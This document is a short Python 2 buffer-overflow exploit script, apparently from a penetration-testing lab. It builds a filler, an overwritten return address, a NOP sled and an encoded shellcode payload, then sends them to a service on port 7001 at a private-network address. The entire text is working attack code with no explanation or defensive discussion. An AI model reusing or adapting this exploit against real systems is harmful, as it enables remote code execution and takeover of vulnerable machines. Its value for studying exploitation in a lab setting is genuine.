#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  payload = ("\xbe\x12\xe4\x2f\xbb\xd9\xec\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x73\x12\x03\x73\x12\x83\xf9\x18\xcd\x4e\x01\x08\x90"
"\xb1\xf9\xc9\xf5\x38\x1c\xf8\x35\x5e\x55\xab\x85\x14\x3b\x40"
"\x6d\x78\xaf\xd3\x03\x55\xc0\x54\xa9\x83\xef\x65\x82\xf0\x6e"
"\xe6\xd9\x24\x50\xd7\x11\x39\x91\x10\x4f\xb0\xc3\xc9\x1b\x67"
"\xf3\x7e\x51\xb4\x78\xcc\x77\xbc\x9d\x85\x76\xed\x30\x9d\x20"
"\x2d\xb3\x72\x59\x64\xab\x97\x64\x3e\x40\x63\x12\xc1\x80\xbd"
"\xdb\x6e\xed\x71\x2e\x6e\x2a\xb5\xd1\x05\x42\xc5\x6c\x1e\x91"
"\xb7\xaa\xab\x01\x1f\x38\x0b\xed\xa1\xed\xca\x66\xad\x5a\x98"
"\x20\xb2\x5d\x4d\x5b\xce\xd6\x70\x8b\x46\xac\x56\x0f\x02\x76"
"\xf6\x16\xee\xd9\x07\x48\x51\x85\xad\x03\x7c\xd2\xdf\x4e\xe9"
"\x17\xd2\x70\xe9\x3f\x65\x03\xdb\xe0\xdd\x8b\x57\x68\xf8\x4c"
"\x97\x43\xbc\xc2\x66\x6c\xbd\xcb\xac\x38\xed\x63\x04\x41\x66"
"\x73\xa9\x94\x29\x23\x05\x47\x8a\x93\xe5\x37\x62\xf9\xe9\x68"
"\x92\x02\x20\x01\x39\xf9\xa3\xee\x16\x76\xf2\x87\x64\x78\xfb"
"\xec\xe0\x9e\x91\x02\xa5\x09\x0e\xba\xec\xc1\xaf\x43\x3b\xac"
"\xf0\xc8\xc8\x51\xbe\x38\xa4\x41\x57\xc9\xf3\x3b\xfe\xd6\x29"
"\x53\x9c\x45\xb6\xa3\xeb\x75\x61\xf4\xbc\x48\x78\x90\x50\xf2"
"\xd2\x86\xa8\x62\x1c\x02\x77\x57\xa3\x8b\xfa\xe3\x87\x9b\xc2"
"\xec\x83\xcf\x9a\xba\x5d\xb9\x5c\x15\x2c\x13\x37\xca\xe6\xf3"
"\xce\x20\x39\x85\xce\x6c\xcf\x69\x7e\xd9\x96\x96\x4f\x8d\x1e"
"\xef\xad\x2d\xe0\x3a\x76\x5d\xab\x66\xdf\xf6\x72\xf3\x5d\x9b"
"\x84\x2e\xa1\xa2\x06\xda\x5a\x51\x16\xaf\x5f\x1d\x90\x5c\x12"
"\x0e\x75\x62\x81\x2f\x5c")

  filler = "A" * 0xA00 # 2560
  eip = "\x83\x0c\x09\x10"
  offset = "C" * 4
  sled = "\x90" * 16
  shellcode = "D" * 1000
  inputBuffer = filler + eip + offset + sled + payload

  buffer = inputBuffer
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.176.227", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
